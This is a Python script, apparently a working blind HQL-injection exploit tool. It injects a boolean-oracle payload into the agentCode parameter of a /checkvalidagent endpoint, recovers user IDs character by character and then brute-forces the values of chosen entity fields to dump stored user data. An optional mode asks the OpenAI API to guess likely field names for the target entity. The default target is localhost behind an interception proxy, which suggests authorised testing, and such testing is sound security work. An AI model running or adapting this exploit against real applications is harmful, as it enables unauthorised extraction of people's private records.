#!/usr/bin/env python3
import requests, urllib3, time, argparse, os, json, re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =======================
# CONFIG (edit these)
# =======================
URL = "http://localhost:8443/checkvalidagent"  # GET endpoint that accepts ?agentCode=
VERIFY_TLS = False
PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}  # set None to disable
HEADERS = {}  # extra headers if needed

# Phase 1: userId discovery
TARGET_USER_COUNT = 2
USERID_MAXLEN = 8
USERID_CHARSET = "0123456789"  # observed

# Phase 2: fields to try per user
FIELDS = []
DEFAULT_MAXLEN = 80
FIELD_MAXLEN = {
}

# Phase 3: value brute charset
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._- @:/()[]+,"
SLEEP_BETWEEN = 0.0  # throttle if needed

# Runtime flags
DEBUG = False
AI_MODE = False
AI_FIELD_COUNT = 10


def _lower_camel(s: str) -> str:
    if not s:
        return s
    return s[0].lower() + s[1:]

def _sanitize_field_name(name: str):
    # keep only valid identifier-like names suitable for HQL property refs
    name = name.strip()
    # drop numbering like "1. field" or "- field" or quotes
    name = re.sub(r"^\s*[\d\-\.)]+\s*", "", name)
    name = name.strip("`\"' ")
    name = _lower_camel(name)
    if re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", name or ""):
        return name
    return None

def augment_fields_from_ai(entity_full_name: str, count: int):
    """Fetch up to `count` likely property names for the entity and extend FIELDS."""
    api_key = os.environ.get("OPENAI_API_KEY")
    if not api_key:
        print("[!] --ai-mode set but OPENAI_API_KEY not found in environment")
        raise SystemExit(2)

    entity_simple = entity_full_name.split(".")[-1]
    system_msg = "You are a concise assistant that outputs JSON only."
    user_msg = (
        f"Given the entity name, return a JSON array (max {count}) of likely property names "
        "for that entity as lowerCamelCase strings only. No explanations.\n"
        f"Entity full name: {entity_full_name}\n"
        f"Entity simple name: {entity_simple}"
    )

    url = "https://api.openai.com/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json",
    }
    payload = {
        "model": "gpt-4o-mini",
        "messages": [
            {"role": "system", "content": system_msg},
            {"role": "user", "content": user_msg},
        ],
        "temperature": 0.2,
        "max_tokens": 300,
    }

    try:
        # Do not use the app's proxy or TLS settings for OpenAI calls
        resp = requests.post(url, headers=headers, json=payload, timeout=30)
        if resp.status_code != 200:
            print(f"[ai] OpenAI API error: {resp.status_code} {resp.text[:200]}")
            return
        data = resp.json()
        content = ((data.get("choices") or [{}])[0].get("message") or {}).get("content") or "[]"
        suggestions: list[str] = []
        try:
            parsed = json.loads(content)
            if isinstance(parsed, list):
                suggestions = [str(x) for x in parsed][:count]
            else:
                suggestions = []
        except Exception:
            # Fallback: split by commas/newlines and clean
            raw_parts = re.split(r"[\n,]", content)
            suggestions = [p.strip() for p in raw_parts if p.strip()]

        cleaned: list[str] = []
        seen = set()
        for s in suggestions:
            nm = _sanitize_field_name(s)
            if not nm:
                continue
            if nm in seen:
                continue
            seen.add(nm)
            cleaned.append(nm)
            if len(cleaned) >= count:
                break

        if not cleaned:
            print("[ai] No usable suggestions parsed from AI response")
            return

        # Merge into FIELDS without duplicates, preserve existing order
        added = [f for f in cleaned if f not in FIELDS]
        if added:
            FIELDS.extend(added)
            print(f"[ai] added {len(added)} field(s): {added}")
        else:
            print("[ai] No new fields to add (all were already present)")
    except Exception as e:
        print(f"[ai] Failed to fetch suggestions: {e}")
        return

def augment_fields_from_file(path: str):
    """Read field names from a text file and extend FIELDS.

    - Accepts one name per line; lines may contain inline comments after '#'.
    - Also supports comma/whitespace separated lists per line.
    - Names are sanitized to identifier-like lowerCamelCase.
    """
    if not path:
        return
    if not os.path.isfile(path):
        print(f"[!] --fields file not found: {path}")
        raise SystemExit(2)
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            raw = fh.read()
    except Exception as e:
        print(f"[!] Failed to read --fields file: {e}")
        raise SystemExit(2)

    tokens: list[str] = []
    for line in raw.splitlines():
        # strip comments
        line = line.split('#', 1)[0].strip()
        if not line:
            continue
        parts = [p.strip() for p in re.split(r"[\s,]+", line) if p.strip()]
        tokens.extend(parts)

    cleaned: list[str] = []
    seen = set()
    for t in tokens:
        nm = _sanitize_field_name(t)
        if not nm or nm in seen:
            continue
        seen.add(nm)
        cleaned.append(nm)

    if not cleaned:
        print("[fields] No usable field names found in file")
        return

    added = [f for f in cleaned if f not in FIELDS]
    if added:
        FIELDS.extend(added)
        print(f"[fields] added {len(added)} field(s) from file: {added}")
    else:
        print("[fields] No new fields to add from file (duplicates only)")

# =======================
# Core utils
# =======================
def esc(s: str) -> str:
    return s.replace("'", "''")

def inj(expr: str) -> str:
    # Boolean oracle wrapper
    return f"0' or ({expr}) or '1'='2"

def exists(hql_bool: str) -> str:
    return f"exists ( from {HQL_ENTITY} u where {hql_bool} )"

def do_request(agent: str):
    params = {"agentCode": agent}
    r = requests.get(URL, params=params, headers=HEADERS,
                     timeout=20, verify=VERIFY_TLS, proxies=PROXY)
    try:
        j = r.json()
    except Exception:
        print(f"[!] Non-JSON response: {r.status_code} {r.text}")
        return None
    mi = j.get("msgInfo") or {}
    sc = str(mi.get("statusCode") or "")
    msg = mi.get("message") or ""
    if DEBUG:
        print(f"[req] agentCode={agent!r} -> statusCode={sc}, message={msg}")
    if SLEEP_BETWEEN:
        time.sleep(SLEEP_BETWEEN)
    return j

def truthy(agent: str):
    j = do_request(agent)
    if not j: return None
    mi = j.get("msgInfo") or {}
    sc = str(mi.get("statusCode") or "")
    payload = j.get("payload") or {}
    if sc == "400" or payload.get("statusMsg") == "Agent Already Registered":
        return True
    if sc == "401":
        return False
    return None

def oracle_ok() -> bool:
    t_false = truthy(inj(exists("1=0")))
    t_true  = truthy(inj(exists("1=1")))
    ok = (t_false is False and t_true is True)
    print("[*] probe:", "ok" if ok else "odd (continuing)")
    return ok

# =======================
# Phase 1: enumerate userIds
# =======================
def prefix_is_user(prefix: str, extra_where: str = "1=1"):
    return truthy(inj(exists(f"{extra_where} and u.userId like '{esc(prefix)}%'")))

def recover_one_userid(extra_where: str = "1=1"):
    # ensure any row is visible under this filter
    if truthy(inj(exists(extra_where))) is not True:
        return None
    prefix = ""
    for pos in range(1, USERID_MAXLEN + 1):
        advanced = False
        for c in USERID_CHARSET:
            if prefix_is_user(prefix + c, extra_where):
                prefix += c
                print(f"[userId] pos {pos:02d}: {prefix}")
                advanced = True
                break
        if not advanced:
            break
    return prefix if prefix else None

def enumerate_userids(target_count: int) -> list[str]:
    found: list[str] = []
    extra = "1=1"
    while len(found) < target_count:
        uid = recover_one_userid(extra_where=extra)
        if not uid:
            break
        print(f"[result] userId: {uid}")
        found.append(uid)
        # Exclude recovered IDs to get the next
        not_equals = " and ".join([f"u.userId <> '{esc(x)}'" for x in found])
        extra = f"({not_equals})"
    print(f"[done] recovered {len(found)} userId(s): {found}")
    return found

# =======================
# Phase 2–3: fields & values
# =======================
def field_not_null(user_id: str, field: str):
    where = f"u.userId = '{esc(user_id)}' and u.{field} is not null"
    return truthy(inj(exists(where)))

def has_len_at_least(user_id: str, field: str, n: int):
    where = f"u.userId = '{esc(user_id)}' and u.{field} is not null and length(u.{field}) >= {n}"
    return truthy(inj(exists(where)))

def prefix_is(user_id: str, field: str, prefix: str):
    where = f"u.userId = '{esc(user_id)}' and u.{field} like '{esc(prefix)}%'"
    return truthy(inj(exists(where)))

def recover_field(user_id: str, field: str, maxlen: int):
    present = field_not_null(user_id, field)
    if present is not True:
        print(f"[i] {field} is null/absent for {user_id}")
        return None

    # length bound
    length = 0
    for k in range(1, maxlen + 1):
        t = has_len_at_least(user_id, field, k)
        if t is True:  length = k
        elif t is False: break
        else: break

    if length == 0:
        print(f"[i] {field} length=0 for {user_id}")
        return ""

    # brute prefix
    val = ""
    for pos in range(1, length + 1):
        advanced = False
        for c in CHARSET:
            if prefix_is(user_id, field, val + c):
                val += c
                print(f"[+] {user_id} :: {field} pos {pos:02d}: {val!r}")
                advanced = True
                break
        if not advanced:
            print(f"[!] stalled at pos {pos} for {field} on {user_id}; widen CHARSET")
            break
    return val

def discover_and_dump_fields(user_ids: list[str]):
    results = []
    for uid in user_ids:
        print(f"\n===== Enumerating fields for userId {uid} =====")
        for field in FIELDS:
            maxlen = FIELD_MAXLEN.get(field, DEFAULT_MAXLEN)
            value = recover_field(uid, field, maxlen)
            if value is not None:
                print(f"[result] {uid} :: {field} = {repr(value)}")
                results.append((uid, field, value))
    print("\n=== OVERALL RESULTS ===")
    for uid, field, value in results:
        print(f"{uid} :: {field} = {repr(value)}")
    return results

# =======================
# Main
# =======================
def main():
    global DEBUG, HQL_ENTITY, AI_MODE, AI_FIELD_COUNT
    parser = argparse.ArgumentParser(description="HQLi helper")
    parser.add_argument("--debug", action="store_true", help="Enable verbose request logging")
    parser.add_argument("--entity", required=True, help="HQL entity name (FQN or simple), e.g. com.pdstat.hqli.entity.User1")
    parser.add_argument("--ai-mode", action="store_true", help="Use OpenAI to suggest extra fields (requires OPENAI_API_KEY)")
    parser.add_argument("--fields", required=True, help="Path to a wordlist file of field names to try (one per line)")
    parser.add_argument("--ai-field-count", type=int, default=10, help="How many fields to fetch from OpenAI when --ai-mode is enabled (default: 10)")
    args = parser.parse_args()
    DEBUG = args.debug
    HQL_ENTITY = args.entity
    AI_MODE = args.ai_mode
    AI_FIELD_COUNT = max(1, min(int(args.ai_field_count or 10), 50))

    if args.fields:
        augment_fields_from_file(args.fields)

    if AI_MODE:
        augment_fields_from_ai(HQL_ENTITY, AI_FIELD_COUNT)

    oracle_ok()
    user_ids = enumerate_userids(TARGET_USER_COUNT)
    if not user_ids:
        pass
    if user_ids:
        discover_and_dump_fields(user_ids)
    else:
        print("[i] No userIds available for field enumeration")

if __name__ == "__main__":
    main()
